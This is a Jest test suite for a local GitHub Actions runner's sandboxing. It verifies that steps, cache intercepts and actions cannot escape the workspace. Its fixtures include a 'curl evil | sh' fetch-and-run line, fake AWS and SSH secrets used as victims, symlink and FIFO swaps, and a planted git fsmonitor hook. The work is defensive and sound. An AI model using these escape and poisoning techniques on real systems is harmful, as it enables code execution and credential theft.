/**
 * Where a step runs, and what its sandbox profile is rooted at.
 *
 * A workflow names directories - a step's working-directory, a job default,
 * a local action's path - and each used to become the root of the step's
 * sandbox profile: readable, writable and a place to bind sockets. Naming /
 * handed a step the whole disk, strict or not. These tests hold the spawn
 * and read the profile it was given.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { EventEmitter } from 'events';
import { PassThrough } from 'stream';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as childProcess from 'child_process';
import * as actionFetcher from './action-fetcher';
import { executeStep, ExecutionContext } from './step-executor';
import type { WorkflowJob, WorkflowStep } from './workflow-parser';

jest.mock('child_process', () => {
  const actual = jest.requireActual<typeof import('child_process')>('child_process');
  return { ...actual, spawn: jest.fn() };
});

// A scratch home per test, so nothing here reads or writes the real one.
jest.mock('os', () => {
  const actual = jest.requireActual<typeof import('os')>('os');
  return { ...actual, homedir: jest.fn(actual.homedir) };
});

jest.mock('./action-fetcher', () => {
  const actual = jest.requireActual<typeof import('./action-fetcher')>('./action-fetcher');
  return { ...actual, fetchAction: jest.fn() };
});

const spawn = jest.mocked(childProcess.spawn);
const fetchAction = jest.mocked(actionFetcher.fetchAction);

interface Spawned {
  command: string;
  args: string[];
  cwd: string;
  detached?: boolean;
  profile: string;
  profilePath: string;
  profileMode: number;
  profileDirMode: number;
}

/** Every spawn this test saw, with the profile file read while it still existed. */
let spawned: Spawned[];

/** What the fake step does while it "runs", given its environment. */
let duringStep: ((env: Record<string, string>) => void) | undefined;

afterEach(() => {
  duringStep = undefined;
});

beforeEach(() => {
  spawned = [];
  spawn.mockImplementation(((
    command: string,
    args: string[],
    options: { cwd: string; detached?: boolean; env: Record<string, string> }
  ) => {
    duringStep?.(options.env);
    const profilePath = args[args.indexOf('-f') + 1];
    spawned.push({
      command,
      args,
      cwd: options.cwd,
      detached: options.detached,
      profile: fs.readFileSync(profilePath, 'utf-8'),
      profilePath,
      profileMode: fs.statSync(profilePath).mode & 0o777,
      profileDirMode: fs.statSync(path.dirname(profilePath)).mode & 0o777,
    });
    const child = new EventEmitter() as childProcess.ChildProcess;
    const stdin = new PassThrough();
    stdin.resume();
    Object.assign(child, { pid: 999999, stdin, stdout: new PassThrough(), stderr: new PassThrough() });
    setImmediate(() => {
      (child.stdout as PassThrough).end();
      (child.stderr as PassThrough).end();
      child.emit('exit', 0, null);
      child.emit('close', 0, null);
    });
    return child;
  }) as never);
});

let scratch: string;
let workDir: string;

beforeEach(() => {
  scratch = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'step-containment-')));
  workDir = path.join(scratch, 'ws');
  fs.mkdirSync(path.join(workDir, 'sub'), { recursive: true });
  fs.mkdirSync(path.join(scratch, 'home'));
  jest.mocked(os.homedir).mockReturnValue(path.join(scratch, 'home'));
  process.env.LOCALMOST_CONFIG_DIR = path.join(scratch, 'appdata');
});

afterEach(() => {
  delete process.env.LOCALMOST_CONFIG_DIR;
  fs.rmSync(scratch, { recursive: true, force: true });
});

const context = (): ExecutionContext => ({
  workDir,
  proxyPort: 1234,
  workflowEnv: {},
  cacheScope: { sourceDir: '/src/checkout', repository: 'owner/repo', ref: 'refs/heads/main' },
  jobEnv: {},
  matrix: {},
  secrets: {},
  stepOutputs: {},
});

const job = (defaults?: WorkflowJob['defaults']): WorkflowJob =>
  ({ 'runs-on': 'self-hosted', steps: [], defaults }) as WorkflowJob;

const run = (step: WorkflowStep, j: WorkflowJob = job()) => executeStep(step, context(), j);

describe('a step\'s working-directory', () => {
  it('is refused when it names a directory outside the workspace', async () => {
    for (const dir of ['/', '..', '../..', os.homedir()]) {
      const result = await run({ run: 'true', 'working-directory': dir });
      expect(result.status).toBe('failure');
      expect(result.error).toMatch(/outside the workspace/);
    }
    expect(spawn).not.toHaveBeenCalled();
  });

  it('is refused when a symlink in the workspace leads out of it', async () => {
    fs.symlinkSync(scratch, path.join(workDir, 'escape'));
    const result = await run({ run: 'true', 'working-directory': 'escape' });
    expect(result.status).toBe('failure');
    expect(spawn).not.toHaveBeenCalled();
  });

  it('is refused as a job default too', async () => {
    const result = await run({ run: 'true' }, job({ run: { 'working-directory': '/' } }));
    expect(result.status).toBe('failure');
    expect(spawn).not.toHaveBeenCalled();
  });

  it('runs the step there, under a profile rooted at the workspace', async () => {
    const result = await run({ run: 'true', 'working-directory': 'sub' });
    expect(result.status).toBe('success');
    expect(spawned).toHaveLength(1);
    expect(spawned[0].cwd).toBe(path.join(workDir, 'sub'));
    expect(spawned[0].profile).toContain(`(allow file-write*\n  (subpath "${workDir}"))`);
    expect(spawned[0].profile).not.toContain(`(subpath "${path.join(workDir, 'sub')}")`);
    expect(spawned[0].profile).not.toContain('(subpath "/")');
  });
});

describe('the profile a step is spawned with', () => {
  // The app data directory as it is outside tests: not under the temp
  // directories, which every sandboxed step and runner job may write.
  let appData: string;

  beforeEach(() => {
    const build = path.join(process.cwd(), 'build');
    fs.mkdirSync(build, { recursive: true });
    appData = fs.realpathSync(fs.mkdtempSync(path.join(build, 'step-appdata-')));
    process.env.LOCALMOST_CONFIG_DIR = appData;
  });

  afterEach(() => {
    fs.rmSync(appData, { recursive: true, force: true });
  });

  it('is written where no step can reach it, private, and removed once the step is done', async () => {
    // In os.tmpdir(), under a name taken from the clock, a step could plant a
    // symlink at the next profile's path or swap a profile before its use.
    const result = await run({ run: 'true' });
    expect(result.status).toBe('success');
    const [{ profilePath, profileMode, profileDirMode }] = spawned;

    for (const tmp of [os.tmpdir(), fs.realpathSync(os.tmpdir()), '/tmp', '/private/tmp']) {
      expect(profilePath.startsWith(tmp + path.sep)).toBe(false);
    }
    expect(profilePath.startsWith(path.join(appData, 'test-sandbox-profiles') + path.sep)).toBe(true);
    expect(profileMode).toBe(0o600);
    expect(profileDirMode).toBe(0o700);
    expect(fs.existsSync(profilePath)).toBe(false);
    expect(fs.existsSync(path.dirname(profilePath))).toBe(false);
  });

  it('starts the step in a process group of its own, so what it leaves running can be reaped', async () => {
    await run({ run: 'true' });
    expect(spawned[0].detached).toBe(true);
  });
});

describe('the files the app writes and reads in the workspace', () => {
  // The workspace is the step's to write, so anything the app itself writes
  // or reads there, outside any sandbox, must not follow what a step put in
  // its place. A victim outside the workspace stands for the user's files.
  let victim: string;

  beforeEach(() => {
    victim = path.join(scratch, 'victim');
    fs.writeFileSync(victim, 'aws_secret_access_key=hunter2\n');
  });

  it('does not write the step script through a symlink planted at its name', async () => {
    // The name was the clock, so something left running by an earlier step
    // could plant it ahead of time - and the script is the workflow's text.
    const now = jest.spyOn(Date, 'now').mockReturnValue(1700000000000);
    try {
      fs.symlinkSync(victim, path.join(workDir, '.step-1700000000000.sh'));
      await run({ run: 'echo planted' });
    } finally {
      now.mockRestore();
    }
    expect(fs.readFileSync(victim, 'utf-8')).toBe('aws_secret_access_key=hunter2\n');
  });

  it('does not truncate through a symlink planted at the output file', async () => {
    fs.symlinkSync(victim, path.join(workDir, '.github-output'));
    await run({ run: 'true' });
    expect(fs.readFileSync(victim, 'utf-8')).toBe('aws_secret_access_key=hunter2\n');
  });

  it('does not read a step\'s outputs from a file it swapped for a link to another', async () => {
    for (const link of [fs.symlinkSync, fs.linkSync]) {
      duringStep = (env) => {
        fs.rmSync(env.GITHUB_OUTPUT, { force: true });
        link(victim, env.GITHUB_OUTPUT);
      };
      const result = await run({ id: 'leak', run: 'true' });
      expect(result.outputs).toEqual({});
    }
  });

  it('does not hang on a FIFO a step swapped in for its output file', async () => {
    // Opening a FIFO for reading blocks until a writer appears, and the read
    // is synchronous: the whole run would stop, Ctrl-C included.
    duringStep = (env) => {
      fs.rmSync(env.GITHUB_OUTPUT, { force: true });
      childProcess.execFileSync('/usr/bin/mkfifo', [env.GITHUB_OUTPUT]);
      // A writer, late, so the unfixed read returns rather than hanging forever.
      const actual = jest.requireActual<typeof import('child_process')>('child_process');
      actual
        .spawn('/bin/sh', ['-c', `sleep 3; echo 'leak=1' > '${env.GITHUB_OUTPUT}'`], { detached: true, stdio: 'ignore' })
        .unref();
    };
    const started = Date.now();
    const result = await run({ id: 'fifo', run: 'true' });
    expect(result.outputs).toEqual({});
    expect(Date.now() - started).toBeLessThan(1500);
  });

  it('still reads what a step writes to its output file', async () => {
    duringStep = (env) => fs.appendFileSync(env.GITHUB_OUTPUT, 'answer=42\n');
    const result = await run({ id: 'ok', run: 'true' });
    expect(result.outputs).toEqual({ answer: '42' });
  });
});

describe('the cache intercept', () => {
  // actions/cache is emulated by the app itself, outside any sandbox, with
  // paths the workflow names. Saving an absolute path copied the user's own
  // files into the cache, and restoring one wrote over them.
  let victim: string;
  const cacheRoot = () => path.join(scratch, 'appdata', 'workflow-cache');

  const filesUnder = (dir: string): string[] =>
    fs.existsSync(dir)
      ? fs.readdirSync(dir, { withFileTypes: true }).flatMap((e) =>
          e.isDirectory() ? filesUnder(path.join(dir, e.name)) : [path.join(dir, e.name)])
      : [];

  beforeEach(() => {
    victim = path.join(scratch, 'home', 'keys', 'id_ed25519');
    fs.mkdirSync(path.dirname(victim), { recursive: true });
    fs.writeFileSync(victim, 'PRIVATE KEY\n');
  });

  it('never saves a path outside the workspace', async () => {
    const result = await run({
      uses: 'actions/cache/save@v4',
      with: { key: 'k1', path: `${path.dirname(victim)}\n../home` },
    });
    expect(result.status).toBe('success');
    for (const file of [...filesUnder(cacheRoot()), ...filesUnder(path.join(scratch, 'home', '.localmost'))]) {
      expect(fs.readFileSync(file, 'utf-8')).not.toContain('PRIVATE KEY');
    }
    expect(spawn).not.toHaveBeenCalled();
  });

  it('never restores to a path outside the workspace', async () => {
    // A cache entry laid out the way the intercept used to store one - under
    // ~/.localmost - whose name matches the path being restored.
    const target = path.join(scratch, 'home', '.zshrc');
    for (const root of [cacheRoot(), path.join(scratch, 'home', '.localmost', 'workflow-cache')]) {
      const entry = path.join(root, 'k2');
      fs.mkdirSync(entry, { recursive: true });
      fs.writeFileSync(path.join(entry, target.replace(/[^a-zA-Z0-9_-]/g, '_')), 'curl evil | sh\n');
    }

    await run({ uses: 'actions/cache@v4', with: { key: 'k2', path: target } });

    expect(fs.existsSync(target)).toBe(false);
  });

  it('copies with tar, inside a sandbox rooted at the workspace', async () => {
    fs.mkdirSync(path.join(workDir, 'node_modules'));
    fs.mkdirSync(path.join(workDir, '.home', '.npm'), { recursive: true });
    const result = await run({
      uses: 'actions/cache/save@v4',
      with: { key: 'k3', path: 'node_modules\n~/.npm' },
    });
    expect(result.status).toBe('success');
    expect(spawned).toHaveLength(1);
    const [{ command, args, cwd, profile }] = spawned;
    expect(command).toBe('/usr/bin/sandbox-exec');
    expect(args.slice(2)).toEqual(['/usr/bin/tar', '-c', '-f', '-', '-C', workDir, '--', './node_modules', './.home/.npm']);
    expect(cwd).toBe(workDir);
    expect(profile).toContain(`(allow file-write*\n  (subpath "${workDir}"))`);
    expect(profile).not.toContain(cacheRoot());
  });

  describe('scope', () => {
    // A checkout under test could otherwise save a poisoned node_modules
    // under a key another checkout - or the same repository's default branch
    // - restores and runs.
    const save: WorkflowStep = { uses: 'actions/cache/save@v4', with: { key: 'deps', path: 'node_modules' } };
    const restore: WorkflowStep = {
      id: 'c',
      uses: 'actions/cache@v4',
      with: { key: 'deps', path: 'node_modules', 'restore-keys': 'de' },
    };
    const as = (scope: ExecutionContext['cacheScope'], step: WorkflowStep, workflowEnv: Record<string, string> = {}) =>
      executeStep(step, { ...context(), cacheScope: scope, workflowEnv }, job());

    beforeEach(() => {
      fs.mkdirSync(path.join(workDir, 'node_modules'));
    });

    it('keeps one repository\'s and branch\'s caches from another\'s', async () => {
      await as({ sourceDir: '/src/a', repository: 'evil/fork', ref: 'refs/heads/pr' }, save);
      spawn.mockClear();

      for (const [repository, ref] of [['evil/fork', 'refs/heads/main'], ['good/repo', 'refs/heads/pr']]) {
        const result = await as({ sourceDir: '/src/a', repository, ref }, restore);
        expect(result.outputs['cache-hit']).toBe('false');
      }
      expect(spawn).not.toHaveBeenCalled();

      const hit = await as({ sourceDir: '/src/a', repository: 'evil/fork', ref: 'refs/heads/pr' }, restore);
      expect(hit.outputs['cache-hit']).toBe('true');
    });

    it('keeps two checkouts apart even when both claim the same repository and ref', async () => {
      // A tarball with no remote is local/repo; a checkout that ships its own
      // .git names whatever origin it likes. Where it sits on disk is the one
      // thing it cannot choose.
      await as({ sourceDir: '/downloads/untrusted', repository: 'local/repo', ref: '' }, save);
      spawn.mockClear();

      const result = await as({ sourceDir: '/src/mine', repository: 'local/repo', ref: '' }, restore);
      expect(result.outputs['cache-hit']).toBe('false');
      expect(spawn).not.toHaveBeenCalled();
    });

    it('takes the scope from the checkout, never from what the workflow\'s env claims', async () => {
      // A workflow's top-level env is the checkout's to write, and it used to
      // decide the scope: naming another repository and ref reached its cache.
      const claim = { GITHUB_REPOSITORY: 'victim/repo', GITHUB_REF: 'refs/heads/main' };
      await as({ sourceDir: '/src/pr', repository: 'evil/fork', ref: 'refs/heads/pr' }, save, claim);
      spawn.mockClear();

      const result = await as({ sourceDir: '/src/victim', repository: 'victim/repo', ref: 'refs/heads/main' }, restore, claim);
      expect(result.outputs['cache-hit']).toBe('false');
      expect(spawn).not.toHaveBeenCalled();
    });

    it('caches nothing when the run did not say whose cache it is', async () => {
      const saved = await as(undefined, save);
      expect(saved.status).toBe('success');
      expect(spawn).not.toHaveBeenCalled();
      expect(fs.existsSync(cacheRoot())).toBe(false);
    });
  });
});

describe('the checkout intercept', () => {
  it('runs no git in the workspace, whatever a step left there', () => {
    // A step can create .git in the workspace with core.fsmonitor set to its
    // own script; git runs that on status, and the intercept ran git here
    // unsandboxed.
    const marker = path.join(scratch, 'fsmonitor-ran');
    const hook = path.join(workDir, 'hook.sh');
    fs.writeFileSync(hook, `#!/bin/sh\ntouch '${marker}'\n`, { mode: 0o755 });
    const git = (args: string) =>
      jest.requireActual<typeof import('child_process')>('child_process').execSync(`git ${args}`, {
        cwd: workDir,
        stdio: 'ignore',
        env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' },
      });
    git('init -q');
    git('-c user.name=t -c user.email=t@t commit -q --allow-empty -m init');
    git(`config core.fsmonitor '${hook}'`);

    return Promise.all([
      run({ uses: 'actions/checkout@v4' }),
      run({ uses: 'actions/checkout@v4', with: { submodules: true } }),
    ]).then((results) => {
      expect(results.map((r) => r.status)).toEqual(['success', 'success']);
      expect(fs.existsSync(marker)).toBe(false);
    });
  });
});

describe('a local action', () => {
  const writeAction = (dir: string) => {
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(
      path.join(dir, 'action.yml'),
      'name: t\nruns:\n  using: node20\n  main: index.js\n'
    );
    fs.writeFileSync(path.join(dir, 'index.js'), '');
  };

  it('is refused when its path leaves the workspace', async () => {
    writeAction(path.join(scratch, 'outside'));
    for (const uses of ['./../outside', '../outside']) {
      const result = await run({ uses });
      expect(result.status).toBe('failure');
      expect(result.error).toMatch(/outside the workspace/);
    }
    fs.symlinkSync(path.join(scratch, 'outside'), path.join(workDir, 'linked'));
    expect((await run({ uses: './linked' })).status).toBe('failure');
    expect(spawn).not.toHaveBeenCalled();
  });

  it('runs from the workspace, under a profile rooted at the workspace', async () => {
    writeAction(path.join(workDir, 'act'));
    const result = await run({ uses: './act' });
    expect(result.status).toBe('success');
    expect(spawned[0].cwd).toBe(workDir);
    expect(spawned[0].profile).toContain(`(allow file-write*\n  (subpath "${workDir}"))`);
  });
});

describe('a fetched action', () => {
  let actionDir: string;

  beforeEach(() => {
    actionDir = path.join(scratch, 'appdata', 'actions', 'owner', 'repo', 'v1');
    fs.mkdirSync(actionDir, { recursive: true });
    fs.writeFileSync(path.join(actionDir, 'action.yml'), 'name: t\nruns:\n  using: node20\n  main: dist/index.js\n');
    fs.mkdirSync(path.join(actionDir, 'dist'));
    fs.writeFileSync(path.join(actionDir, 'dist', 'index.js'), '');
    fetchAction.mockResolvedValue({
      ref: { owner: 'owner', repo: 'repo', version: 'v1' },
      localPath: actionDir,
      fetchedAt: new Date().toISOString(),
    });
  });

  it('runs in the workspace with its own code readable and not writable', async () => {
    const result = await run({ uses: 'owner/repo@v1' });
    expect(result.status).toBe('success');
    expect(spawned[0].cwd).toBe(workDir);
    const { profile } = spawned[0];
    expect(profile).toContain(`(allow file-read*\n  (subpath "${actionDir}"))`);
    const writeGrants = profile.split('\n(').filter((form) => form.startsWith('allow file-write'));
    expect(writeGrants.filter((form) => form.includes(actionDir))).toEqual([]);
  });

  it('reaches the loopback ports the run was granted, as a run: step does', async () => {
    // Only the proxy, until the user confirms the checkout's grant.
    expect((await run({ run: 'true' })).status).toBe('success');
    expect(spawned[0].profile).toContain('(allow network-outbound (remote ip "localhost:1234"))');
    expect(spawned[0].profile).not.toContain('(remote ip "localhost:*")');
    expect(spawned[0].profile).not.toContain('"localhost:5432"');
    await executeStep({ run: 'true' }, { ...context(), loopback: [5432] }, job());
    expect(spawned[1].profile).toContain('(allow network-outbound (remote ip "localhost:5432"))');
    spawned = [];

    const result = await executeStep({ uses: 'owner/repo@v1' }, { ...context(), loopback: [5432] }, job());
    expect(result.status).toBe('success');
    expect(spawned[0].profile).toContain('(allow network-outbound (remote ip "localhost:5432"))');
  });

  it('refuses an entry point that climbs out of the action', async () => {
    fs.writeFileSync(path.join(actionDir, 'action.yml'), 'name: t\nruns:\n  using: node20\n  main: ../../../../x.js\n');
    fs.writeFileSync(path.join(scratch, 'appdata', 'x.js'), '');
    const result = await run({ uses: 'owner/repo@v1' });
    expect(result.status).toBe('failure');
    expect(result.error).toMatch(/outside the action/);
    expect(spawn).not.toHaveBeenCalled();
  });
});
